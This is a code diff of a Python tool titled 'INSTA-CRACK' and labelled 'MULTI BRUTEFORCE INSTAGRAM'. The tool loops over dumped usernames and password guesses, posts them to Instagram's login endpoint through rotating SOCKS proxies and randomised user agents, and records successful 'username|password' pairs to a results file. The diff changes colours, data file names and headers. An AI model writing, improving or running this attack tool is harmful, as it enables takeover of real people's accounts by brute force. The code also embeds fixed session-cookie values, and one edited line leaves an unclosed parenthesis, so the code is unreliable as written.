@@ -1,4 +1,4 @@
-import os, re, sys, time, json, random, requests, __main__
+import os, re, sys, time, json, random, requests
 from secrets import choice
 from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import ConnectionError
@@ -6,6 +6,7 @@ from time import sleep
 
 # Warna
 H = ('\x1b[1;90m')
+V = ('\33[0;36m')
 M = ('\x1b[1;91m')
 H = ('\x1b[1;92m')
 K = ('\x1b[1;93m')
@@ -19,20 +20,20 @@ Z = "\x1b[0;90m"
 
 #LOGO
 ___logo___ = (f"""{H}
-{T}╔════════════════════════════════════════════════════════════════════════════════════════╗
-{T}║                                                                                        ║
-{T}║                                                                                        ║
-{T}║                                                                                        ║
-{T}║  {B}██╗███╗   ██╗███████╗████████╗ █████╗        ██████╗██████╗  █████╗  ██████╗██╗  ██╗  {T}║
-{T}║  {B}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝  {T}║
-{T}║  {B}██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║     ██████╔╝███████║██║     █████╔╝   {T}║
-{T}║  {U}██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗   {T}║
-{T}║  {U}██║██║ ╚████║███████║   ██║   ██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  {T}║
-{T}║  {U}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  {T}║
-{T}║                                                                                        {T}║
-{T}║                                                                      {A}VERSION{P}: {H}BETA-VIP {T}║
-{T}║                                                                                        {T}║
-{T}╚════════════════════════════════════════════════════════════════════════════════════════╝
+{A}╔════════════════════════════════════════════════════════════════════════════════════════╗
+{A}║                                                                                        ║
+{A}║                                                                                        ║
+{A}║                                                                                        ║
+{A}║  {V}██╗███╗   ██╗███████╗████████╗ █████╗        ██████╗██████╗  █████╗  ██████╗██╗  ██╗  {A}║
+{A}║  {V}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝  {A}║
+{A}║  {V}██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║     ██████╔╝███████║██║     █████╔╝   {A}║
+{A}║  {U}██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗   {A}║
+{A}║  {U}██║██║ ╚████║███████║   ██║   ██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  {A}║
+{A}║  {U}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  {A}║
+{A}║                                                                                        {A}║
+{A}║                                                                      {A}VERSION{P}: {H}BETA-VIP {A}║
+{A}║                                                                                        {A}║
+{A}╚════════════════════════════════════════════════════════════════════════════════════════╝
 
 {T}╔════════════════════════════════════════════════════════════════════════════════════════╗
 {T}║                            {A} MULTI BRUTEFORCE INSTAGRAM                                 {T}║
@@ -349,10 +350,10 @@ def ___proxy___():
         open('Data/proxy.txt', 'w').write(___roz)
     except Exception as e:
         ___proxy = open('Data/proxy3.txt', 'r').read()
-        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
-        open('Data/proxy.txt', 'w').write(___roz)
+        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy3.txt').text
+        open('Data/proxy3.txt', 'w').write(___roz)
     ___crack___()
-
+# Crack
 class ___crack___:
     
     def __init__(self):
@@ -399,31 +400,27 @@ class ___crack___:
             exit(f"{T}[{M}!{T}]{M} Crack is complete, there seems to be an error, please re-dump!")
     def __main__(self, user, uid, pwx):
         try:
-            ___useragent = open('Data/ua2.txt', 'r').read()
+            ___useragent = open('Data/head.txt', 'r').read()
         except (IOError):
-            ___useragent = random.choice('Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
-'Mozilla/5.0 (Linux; Android 5.0; Lenovo K50-t5 Build/LRX21M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (21/5.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K50-t5; aio_otfp; mt6752; ru_RU; 99640911)',
-'Mozilla/5.0 (Linux; Android 4.2.2; Lenovo A7600-F Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36')
+            ___useragent = ('Mozilla/5.0 (Linux; Android 5.0; Lenovo K50-t5 Build/LRX21M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (21/5.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K50-t5; aio_otfp; mt6752; ru_RU; 99640911)',
         try:
             for pw in pwx:
                 pw = pw.lower()
                 ___url = ('https://www.instagram.com/')
                 ___login = ('https://www.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy3.txt","r").read().splitlines()))}
-                ___proxy3 = {'http': 'socks5://%s'%(random.choice(open("Data/proxy1.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
                 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                 'queryParams': {},
                 'optIntoOneTap': 'false'}
-                ___head = {'User-Agent': random.choice(open("Data/head.txt","r").read().splitlines()),
+                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
+                'Referer': 'https://z-p15.www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                     if 'userId' in str(response):
-                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                         try:
                             ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                             follower = ___roz['edge_followed_by']['count']
@@ -436,8 +433,7 @@ class ___crack___:
                         print(f"{T}║ [{Z}>{T}]{A} Username {T}:{H} {uid}")
                         print(f"{T}║ [{Z}>{T}]{A} Password {T}:{H} {pw}")
                         print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{H} {follower}")
-                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{H} {following}")
-                        print(f"{T}║ [{Z}>{T}]{A} Cookie :{H} {coki}\n")
+                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{H} {following}\n")
                         self.ok.append(f"{uid}|{pw}")
                         open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                         break
